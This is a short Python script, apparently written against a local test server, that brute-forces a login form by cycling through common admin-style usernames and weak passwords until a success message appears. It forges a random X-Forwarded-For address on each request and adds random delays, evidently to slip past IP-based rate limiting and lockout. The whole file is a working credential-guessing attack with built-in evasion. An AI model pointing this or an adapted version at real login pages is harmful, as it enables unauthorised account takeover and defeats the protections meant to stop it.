import requests
import random
import time

TARGET_URL = "http://127.0.0.1:5000/login"

def generate_random_ip():

    return ".".join(
        str(random.randint(1, 254))
        for _ in range(4)
    )

def generate_username():

    usernames = [
        "admin",
        "administrator",
        "root",
        "support",
        "manager",
        "finance",
        "guest",
        "user",
        "test"
    ]

    return random.choice(usernames)

passwords = [
    "1234",
    "password",
    "admin",
    "welcome",
    "qwerty",
    "test123",
    "wrongpass"
]

attempt = 1

while True:

    username = generate_username()
    password = random.choice(passwords)
    ip = generate_random_ip()

    response = requests.post(
        TARGET_URL,
        data={
            "username": username,
            "password": password
        },
        headers={
            "X-Forwarded-For": ip
        }
    )

    print(
        f"[{attempt}] "
        f"IP={ip} "
        f"USER={username} "
        f"PASS={password}"
    )

    if "Login Successful" in response.text:

        print("\nSUCCESS LOGIN FOUND")
        print(f"Username: {username}")
        print(f"Password: {password}")

        break

    attempt += 1

    time.sleep(
        random.uniform(0.5, 2)
    )